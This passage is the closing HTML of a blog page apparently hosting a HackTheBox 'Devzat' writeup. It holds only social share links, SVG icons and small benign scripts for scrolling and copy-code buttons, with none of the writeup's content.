512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Devzat on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20Devzat%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_devzat%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Devzat on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20Devzat&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_devzat%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>